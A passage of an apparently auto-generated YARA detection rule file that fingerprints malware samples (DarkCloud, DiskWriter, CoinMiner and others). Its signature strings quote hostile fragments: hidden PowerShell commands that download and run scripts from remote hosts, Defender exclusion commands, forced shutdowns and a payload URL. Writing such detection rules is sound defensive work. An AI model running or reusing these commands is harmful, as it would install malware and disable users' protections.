      $s9 = "$HFxYdCkeJt = $KQzaigETNquGr" fullword ascii /* score: '9.00'*/
      $s10 = "+30)))) {" fullword ascii /* score: '9.00'*/ /* hex encoded string '0' */
      $s11 = "$PrgnYDCJasZeuX = $KQzaigETNquGr" fullword ascii /* score: '9.00'*/
      $s12 = "$WFhGfykLpi = ([char][int]$DUeYlZEPIar + [char][int]$IKUmugzNCRWyf + [char][int]$HqTcihJUmAI + [char][int]$OEpQKMn + [char][int]" ascii /* score: '8.00'*/
      $s13 = "YNhJueab + [char][int]$tuamNiBdY + [char][int]$ZvqahPWs + [char][int]$UToeJ + [char][int]$pmNxo + [char][int]$NKVzwW + [char][in" ascii /* score: '8.00'*/
      $s14 = "$tzyrIsq = ([char][int]$tUInKs + [char][int]$WwQPjvUodiLK + [char][int]$NlUfT + [char][int]$krsdmAPXMY + [char][int]$ZQdmMIpS + " ascii /* score: '8.00'*/
      $s15 = "$dZxwyFYGcW = ([char][int]$HcENuvm + [char][int]$SPaQqFRdCew + [char][int]$SQzjwoI + [char][int]$DVuBKqymTe + [char][int]$qOJQPf" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6a24 and filesize < 28000KB and
      8 of them
}

rule ca705f3b80b7e5140b7de8913b67177ac126f9eff7e2fa3974828844f70ecab7_ca705f3b {
   meta:
      description = "_subset_batch - file ca705f3b80b7e5140b7de8913b67177ac126f9eff7e2fa3974828844f70ecab7_ca705f3b.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ca705f3b80b7e5140b7de8913b67177ac126f9eff7e2fa3974828844f70ecab7"
   strings:
      $x1 = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"iex ((New-Object Net.WebClient).DownloadString('htt" ascii /* score: '51.00'*/
      $x2 = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"iex ((New-Object Net.WebClient).DownloadString('htt" ascii /* score: '44.00'*/
      $s3 = "s://bkngssercise.com/bomla'))\"" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule DiskWriter_signature__8c7420117c1798ccbc1365dd667cfb20_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_8c7420117c1798ccbc1365dd667cfb20(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2e9d6281e284aa2ed355ac7cd53daaaf21ef09e5694724b0c96c024ce4727bdc"
   strings:
      $x1 = "C:\\Users\\JairPC\\source\\repos\\googoogaga\\Release\\googoogaga.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and all of them
}

rule cb742d4888503ad05aa8842f42219ef85150041916a7b7319a1aa022931e5277_cb742d48 {
   meta:
      description = "_subset_batch - file cb742d4888503ad05aa8842f42219ef85150041916a7b7319a1aa022931e5277_cb742d48.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cb742d4888503ad05aa8842f42219ef85150041916a7b7319a1aa022931e5277"
   strings:
      $x1 = "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w h -c \"(irm -useb http://jekitech.cloud) | powershell\"" fullword ascii /* score: '38.00'*/
   condition:
      uint16(0) == 0x4322 and filesize < 1KB and
      1 of ($x*)
}

rule cbb1f3c03faac5b6a763ad466e465210a9442e7928468bf78c7481d1df1f897f_cbb1f3c0 {
   meta:
      description = "_subset_batch - file cbb1f3c03faac5b6a763ad466e465210a9442e7928468bf78c7481d1df1f897f_cbb1f3c0.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cbb1f3c03faac5b6a763ad466e465210a9442e7928468bf78c7481d1df1f897f"
   strings:
      $x1 = "cQGb6wI0VLsatQ0AcQGbcQGbA1wkBHEBm+sCaRO5bblVFesCYLpxAZuB8ZZbL75xAZtxAZuB8fvieqvrAvmYcQGb6wJBHnEBm7rH3BhTcQGbcQGb6wIiUusCytMxynEB" ascii /* score: '56.00'*/
      $s2 = "J0NvciRCZXJnT3JjbFMueW9Bci5iTSBsYSBGYWxTbWE6UGxhUyByZXZDb25hS2xpZ1BpLmxNdS5pSyxzZ0FsYnQgTG89IEJlWyBSb1NLb210Rixyck1lLGkudWJuQmdl" ascii /* base64 encoded string */ /* score: '26.00'*/
      $s3 = "bnRlcm5lIGdvbmFkZWN0b21pemVkIFN0dWJjaGVuIFBvdGVudGlhbGZ1bmt0aW9uZXJuZXMgRGVmaW5pdG9yIEZpbm5hbiBFcmdhdGFuZHJvbW9ycGhpYyBQb2x5aGVk" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s4 = "b2xpdGlrIEdlbmxzZW5kZXMgU3ltcG9zaWVybmUgU3BpbGRldmFuZHNmb3Job2xkIEFydGhyaXRpY3MgR3JhdmVkZXMgRm9yZXNwcmdzZWxzcHJvZ3JhbXMgS3VmZmVy" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s5 = "aWRzIFJhZ2xhbnJtZXIgRGVzcHVtYXRlZCBVbmRlcmdydXBwZXJuZSBDb2FwdGF0ZSBDb2Fyc2VuIE1hbmRtZW50IFNhY3JpZmljYXRpb24gUml2YWxpbmRlcm5lIEVu" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s6 = "dWxlcmVyIE1vbW8gRmlsbW1lZGlldHMgVGF1dG9sb2dpZXJuZXMgdmVqcnNhdGVsbGl0dGVycyBGZWR0c3lsIEluY2luZXJhYmxlIE1hc3Nha3JlcmVyIFNlbm5lc2Js" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "ZW1hcmNoIE1pZHRlcmxlZG5pbmdlbiBOYXR1cmFsaXN0aWNhbGx5IFRpZHNmb3JtYXRlciBLb2xvbmlhbGhhbmRsZW5zIEJ1ZGdldGZvcnNsYWcgRm9ycGxpZ3RlbHNl" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "ZGlnc3RidCBLYXN0bmluZyBTYWxhbmdpZGFlIFNpbG9lbnMgUGFhdHZpbmdlIEd0ZWJybmVuZSBTZWN1bmRpZmxvcm91cyBDYXRhbGF1bmlhbiBCYXNpcHRlcnlnb2lk" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s9 = "YyAsdXRLLG5peS5lY0xhbiBEZSA9RmxhICBFbigucGkoQi5lZ1Nrb3cuaXNtQSxqaSxvdiBVLHJ3b255aSAgZW5Qcm8zUHIsMiBEaV9TdXBwRW5lck9ra29GLnJjQnVu" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "YW1vcmZvc2VybmUgRGVzdGlsbGF0IFNlbGZpc2hseSBTY2hvb2xlZCBoYXJla2lsbGluZyBFc2thZHJlcm9uaW5nZXJuZSBSaWRlZm9nZWQgQnJpZ2dlcm5lcyBWaWdn" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "dGtvbnRvcmVybmVzIFN1cHBsZW1lbnRzIFVydGVrcm1tZXJuZXMgVW5kZXJob2xkbmluZ2VyIFRvcHRpdGVsIEtpdGNoaWUgWW93bCBDYXJ0aW5nIENodWxscGEgQ3Vz" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s12 = "cmlmZmVyIEVuZXJ2ZXJlZGUgVW5kZXJtdW5kc3Byb3Rlc2VybmUgT3RvY3lzdGljIFJob21ib3JlY3Rhbmd1bGFyIEtvbWJpbmF0aW9uZW5zIEZlc3RibGFua2V0cyBN" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s13 = "dk9pZGVQciByIHRpdEV0aV1TZSA6RCBuOiBXaVR0ci5vRGUuQkJpLHlLYXR0RmUsZURvYyggRmEkU2lyU0Fkc2tTdmFyIE0gaUxpcXYgdXJlU2tpYlR1c2xQaG9vQmVr" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s14 = "SnVsdGtsZW4uYW5pbWUgblN0IGcgQmlzZGFha1N1Ym9iZW9uIEFuc0FyIHQgTWlySmFndU9wc2tTdG90VW5maS5hYW91cm9uQWwgbksubXNGLnJrLGVudVF1IGVTaWxs" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s15 = "bmUgQWxseWxlbmUgYW5pZ2h0cyBVbnJlbWluZGVkIFNwaWxsZXJlbGF0ZXJlcyBDbG92ZW5lIFVud2FyZW5lc3MgaGV0ZXJvY2VyY2FsIEhhcmRib290cyBkcnlhZGUg" ascii /* base64 encoded string  */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x5163 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule CoinMiner_signature__d400a6a867a8623e410a8599e61fe849_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_d400a6a867a8623e410a8599e61fe849(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac26eba542451ac367126a398bf3f92abfa238579928243b6012366394645ff9"
   strings:
      $s1 = "c:\\miniprojects\\x86il\\il86\\x64\\release\\IL86.pdb" fullword ascii /* score: '22.00'*/
      $s2 = "PROC_OUT = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s3 = "PROC_IN = %d, Process = %x" fullword ascii /* score: '20.50'*/
      $s4 = "3)/dumpstatus" fullword ascii /* score: '14.00'*/
      $s5 = "Please, contact the software developers with the following codes. Thank you. (version %d.%d.%d)" fullword ascii /* score: '10.00'*/
      $s6 = "WinLicenseDriverVersion" fullword ascii /* score: '10.00'*/
      $s7 = "c:\\R5=>" fullword ascii /* score: '10.00'*/
      $s8 = "/logstatus" fullword ascii /* score: '9.00'*/
      $s9 = "/getwlstatus" fullword ascii /* score: '9.00'*/
      $s10 = "* #8Gd[" fullword ascii /* score: '9.00'*/
      $s11 = "BeIrCWU<}#T" fullword ascii /* score: '9.00'*/
      $s12 = "* /4B7" fullword ascii /* score: '9.00'*/
      $s13 = "`2%i%U" fullword ascii /* score: '8.00'*/
      $s14 = "9CYwKt -" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      8 of them
}

rule DiskWriter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d83ef371 {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d83ef371.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d83ef371578fa9b04fbfcf57717dd0cfdba54f668befda29daf2254c9966bf97"
   strings:
      $x1 = "C:\\Users\\sun\\source\\repos\\proxxside\\proxxside\\obj\\Debug\\proxxside.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "proxxside.exe" fullword wide /* score: '22.00'*/
      $s3 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s4 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s5 = "proxxside" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      1 of ($x*) and all of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__a8c3af06 {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_a8c3af06.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8c3af06b835b8555242484fb9d451f6a7ee23b4dbca7058dbd3b080e92c89a4"
   strings:
      $s1 = "bkaj1bnb.dll" fullword wide /* score: '23.00'*/
      $s2 = "DummyOperation" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__cf6eed92 {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_cf6eed92.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cf6eed9250ddc61aeeea000b3397350cae988151d985f31ea45d3eeaa25e67be"
   strings:
      $s1 = "zbc2zeru.dll" fullword wide /* score: '23.00'*/
      $s2 = "DummyOperation" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dd2973ad {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dd2973ad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd2973ad690eefefe9ac0ca783447c62aa7ccfa814fa57fa00e1ae9ae51d0171"
   strings:
      $s1 = "oOfy.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.lipsum.com/" fullword wide /* score: '17.00'*/
      $s3 = "tempora" fullword wide /* score: '15.00'*/
      $s4 = "oOfy.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "quaerat" fullword wide /* score: '13.00'*/
      $s6 = "K@@@@@" fullword ascii /* reversed goodware string '@@@@@K' */ /* score: '11.00'*/
      $s7 = "commodo" fullword wide /* score: '11.00'*/
      $s8 = "deserunt" fullword wide /* score: '11.00'*/
      $s9 = "commodi" fullword wide /* score: '11.00'*/
      $s10 = "\"Paragraph Number\",\"Content\",\"Word Count\"" fullword wide /* score: '11.00'*/
      $s11 = "contentFormatter" fullword ascii /* score: '9.00'*/
      $s12 = "ContentFormatter" fullword ascii /* score: '9.00'*/
      $s13 = "HcMu5* " fullword ascii /* score: '8.00'*/
      $s14 = "consectetur" fullword wide /* score: '8.00'*/
      $s15 = "adipiscing" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__6fcf6a13 {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_6fcf6a13.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6fcf6a131f3f251cb3e1a9e2a0d0ff9c82369558c0c5aaaeddc0a6032c0b8e8d"
   strings:
      $s1 = "newa.dll" fullword wide /* score: '23.00'*/
      $s2 = "newa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword wide /* score: '21.00'*/
      $s3 = "PayloadExecutor" fullword ascii /* score: '20.00'*/
      $s4 = "%ExclusionAndAutorun.PayloadExecutor+b" fullword ascii /* score: '20.00'*/
      $s5 = "%ExclusionAndAutorun.PayloadExecutor+c" fullword ascii /* score: '20.00'*/
      $s6 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s7 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
      $s8 = "exdxdxe" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 90KB and
      all of them
}

rule DiskWriter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5c00baa65bdfcb4c8c7bef68a56a11201de38b534f37744d7b42e1efd4d2ac54"
   strings:
      $s1 = "k1rqFbvYXMXeb4ktAh.ipaLXhqv5K4moFdWKp/xBxX9pMadePPoEHUTi/lYK5OI8MhtyMdd8PL5`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s2 = "k1rqFbvYXMXeb4ktAh.ipaLXhqv5K4moFdWKp/xBxX9pMadePPoEHUTi/lYK5OI8MhtyMdd8PL5`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s3 = "My App.exe" fullword wide /* score: '16.00'*/
      $s4 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s5 = "rM6IrCxZIkYBnZp5HY9" fullword ascii /* score: '9.00'*/
      $s6 = "My App.pdb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule d39c247912fb37df219edc6bd31181917d5cdc19ca670bb5ca755bccbc290850_d39c2479 {
   meta:
      description = "_subset_batch - file d39c247912fb37df219edc6bd31181917d5cdc19ca670bb5ca755bccbc290850_d39c2479.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d39c247912fb37df219edc6bd31181917d5cdc19ca670bb5ca755bccbc290850"
   strings:
      $x1 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" fullword wide /* score: '39.00'*/
      $x2 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" fullword wide /* score: '31.00'*/
      $x3 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s4 = "NTdll.dll" fullword ascii /* score: '23.00'*/
      $s5 = "SHCore.dll" fullword ascii /* score: '23.00'*/
      $s6 = "http://ip-api.com/line/?fields=hosting" fullword wide /* score: '22.00'*/
      $s7 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s8 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s9 = "WScript.Shell" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s10 = "oh yeah.exe" fullword wide /* score: '19.00'*/
      $s11 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s12 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s13 = "\\Log.tmp" fullword wide /* score: '17.00'*/
      $s14 = "Win32_Processor.deviceid=\"CPU0\"" fullword wide /* score: '15.00'*/
      $s15 = "Select * from Win32_ComputerSystem" fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bc8af858 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bc8af858.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bc8af8585660edc57262ceb3d66d1ae1b7cdfcfeac2018ee65f9b391cf752cba"
   strings:
      $s1 = "Wcpufdhmlem.exe" fullword wide /* score: '22.00'*/
      $s2 = "BByteSizeLib, Version=1.2.4.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s3 = "HWcpufdhmlem, Version=1.0.2976.4282, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "decryptor" fullword wide /* score: '15.00'*/
      $s5 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s6 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s7 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s8 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s9 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s10 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s11 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s12 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s13 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s14 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s15 = "get_LargestWholeNumberValue" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1b3eb17b {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1b3eb17b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1b3eb17b69aadd787e4d92cfc1fe37821af36317333d0ac23c8812bcd289670a"
   strings:
      $s1 = "Iypxmcru.exe" fullword wide /* score: '22.00'*/
      $s2 = "Iypxmcru.Processing" fullword ascii /* score: '18.00'*/
      $s3 = "decryptor" fullword wide /* score: '15.00'*/
      $s4 = "ProcessTransferableWorker" fullword ascii /* score: '15.00'*/
      $s5 = "ProcessExtendedWorker" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessExternalWorker" fullword ascii /* score: '15.00'*/
      $s7 = "FilterEfficientEncryptor" fullword ascii /* score: '14.00'*/
      $s8 = "AnalyzerLogger" fullword ascii /* score: '14.00'*/
      $s9 = "_CollectorUsers" fullword ascii /* score: '12.00'*/
      $s10 = "FilterVirtualDecryptor" fullword ascii /* score: '11.00'*/
      $s11 = "PostDefinition" fullword ascii /* score: '9.00'*/
      $s12 = "CollectOperationalCollector" fullword ascii /* score: '9.00'*/
      $s13 = "EncodeDefinition" fullword ascii /* score: '9.00'*/
      $s14 = "GetEditableCollector" fullword ascii /* score: '9.00'*/
      $s15 = "GetGroupedCollector" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__59e34c5b {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_59e34c5b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "59e34c5b28ff59864419ac0f826c8cddf026e32affa5dc2db8557673553a3048"
   strings:
      $s1 = "Sboaiczf.exe" fullword wide /* score: '22.00'*/
      $s2 = "ExecuteConfigurableMember" fullword ascii /* score: '21.00'*/
      $s3 = "ExecuteCommonSolver" fullword ascii /* score: '21.00'*/
      $s4 = "ExecutePortableChain" fullword ascii /* score: '21.00'*/
      $s5 = "ExecuteExtendedFinder" fullword ascii /* score: '18.00'*/
      $s6 = "ExecuteAdjustableTask" fullword ascii /* score: '18.00'*/
      $s7 = "ExecuteJoinedTask" fullword ascii /* score: '18.00'*/
      $s8 = "ExecuteEditableTask" fullword ascii /* score: '18.00'*/
      $s9 = "ExecuteSetObserver" fullword ascii /* score: '18.00'*/
      $s10 = "SetRemoteLogger" fullword ascii /* score: '17.00'*/
      $s11 = "decryptor" fullword wide /* score: '15.00'*/
      $s12 = "ProcessTask" fullword ascii /* score: '15.00'*/
      $s13 = "ExecuteVisibleLocator" fullword ascii /* score: '14.00'*/
      $s14 = "PostSystem" fullword ascii /* score: '12.00'*/
      $s15 = "OperateGenericSystem" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5ca24d9e {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5ca24d9e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5ca24d9ef9d96c29199a9857c8e7e1b18cc6ba777ecb7ccc2ed981b6b1ca77f1"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "Rdlwuoo.exe" fullword wide /* score: '22.00'*/
      $s3 = "BByteSizeLib, Version=1.2.4.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s4 = "CRdlwuoo, Version=1.0.2606.849, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = ".NET Framework 4.6l" fullword ascii /* score: '10.00'*/
      $s6 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
      $s7 = "fefefeffe" ascii /* score: '8.00'*/
      $s8 = "afefeffeef" ascii /* score: '8.00'*/
      $s9 = "affeeffefe" ascii /* score: '8.00'*/
      $s10 = "fefefeffea" ascii /* score: '8.00'*/
      $s11 = "feffeeffefe" ascii /* score: '8.00'*/
      $s12 = "ffeefeffefe" ascii /* score: '8.00'*/
      $s13 = "afeffefefea" ascii /* score: '8.00'*/
      $s14 = "ffeeffefeefa" ascii /* score: '8.00'*/
      $s15 = "ffeeffefefe" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__678e8b24 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_678e8b24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "678e8b242423d848b321a91d8b2dd109b538ed279106f4ce3d01353f517120b9"
   strings:
      $s1 = "Vkuxi.exe" fullword wide /* score: '22.00'*/
      $s2 = "ReportLogicalExecutor" fullword ascii /* score: '20.00'*/
      $s3 = "EncryptConnectedDecryptor" fullword ascii /* score: '16.00'*/
      $s4 = "decryptor" fullword wide /* score: '15.00'*/
      $s5 = "FormatterProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "OpenProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "Citpkhcafu.Processing" fullword ascii /* score: '14.00'*/
      $s8 = "EncryptSharer" fullword ascii /* score: '12.00'*/
      $s9 = "LocateLocalCommand" fullword ascii /* score: '11.00'*/
      $s10 = "DecryptorGateway" fullword ascii /* score: '11.00'*/
      $s11 = "ReportSimpleProxy" fullword ascii /* score: '10.00'*/
      $s12 = "ReportCommonInspector" fullword ascii /* score: '10.00'*/
      $s13 = "LogJoinedWriter" fullword ascii /* score: '9.00'*/
      $s14 = "transactionDispatcherContent" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6f80d012 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6f80d012.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f80d01295f586b1b695c2366a306cc5618dc9fb3232416ef4484453eab09806"
   strings:
      $s1 = "Jvttqdoqqua.Execution" fullword ascii /* score: '23.00'*/
      $s2 = "Axbtv.exe" fullword wide /* score: '22.00'*/
      $s3 = "decryptor" fullword wide /* score: '15.00'*/
      $s4 = "RunIterableCommand" fullword ascii /* score: '15.00'*/
      $s5 = "SplitBasicEncryptor" fullword ascii /* score: '14.00'*/
      $s6 = "transformableCommandObj" fullword ascii /* score: '12.00'*/
      $s7 = "TokenizeOperationalFactory" fullword ascii /* score: '12.00'*/
      $s8 = "isolatedCommand" fullword ascii /* score: '12.00'*/
      $s9 = "FlushCommand" fullword ascii /* score: '12.00'*/
      $s10 = "MergeTokenizer" fullword ascii /* score: '12.00'*/
      $s11 = "AnalyzeDetachedTemplate" fullword ascii /* score: '11.00'*/
      $s12 = "CombineTokenizer" fullword ascii /* score: '10.00'*/
      $s13 = "SplitRemoteTokenizer" fullword ascii /* score: '10.00'*/
      $s14 = "RunTokenizer" fullword ascii /* score: '10.00'*/
      $s15 = "Axbtv.Authorization" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7856df4c {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7856df4c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7856df4ccb76c60d843091b84480dca3b2e2a17ce8307a0ac4291cd8e46648c7"
   strings:
      $s1 = "Oiczpk.exe" fullword wide /* score: '22.00'*/
      $s2 = "BByteSizeLib, Version=1.2.4.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
      $s3 = "COiczpk, Version=1.0.3992.5738, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "decryptor" fullword wide /* score: '15.00'*/
      $s5 = "DownloadCompletedEventArgs" fullword ascii /* score: '13.00'*/
      $s6 = "Decryptor3Des" fullword ascii /* score: '11.00'*/
      $s7 = "get_DecryptedData" fullword ascii /* score: '11.00'*/
      $s8 = "energytulcea.ro/Yoecn.dat" fullword wide /* score: '11.00'*/
      $s9 = "PipelineHandlers" fullword ascii /* score: '10.00'*/
      $s10 = "DownloadToBuffer" fullword ascii /* score: '10.00'*/
      $s11 = "add_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s12 = "remove_DecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s13 = "DecryptionCompletedEventArgs" fullword ascii /* score: '9.00'*/
      $s14 = "OnDecryptionCompleted" fullword ascii /* score: '9.00'*/
      $s15 = "DecryptionCompleted" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      8 of them
}

rule E_piro_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file E-piro(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dc139560f851883ccd1fe90bb021d5294f25bc7f04c82fdfa03555112528d7e1"
   strings:
      $x1 = "C:\\Users\\Administrator\\source\\repos\\GHAT\\GHAT\\obj\\Debug\\GHAT.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "GHAT.exe" fullword wide /* score: '22.00'*/
      $s3 = "get_BLACKHAWK" fullword ascii /* score: '9.00'*/
      $s4 = "Clouduser" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__375229df {
   meta:
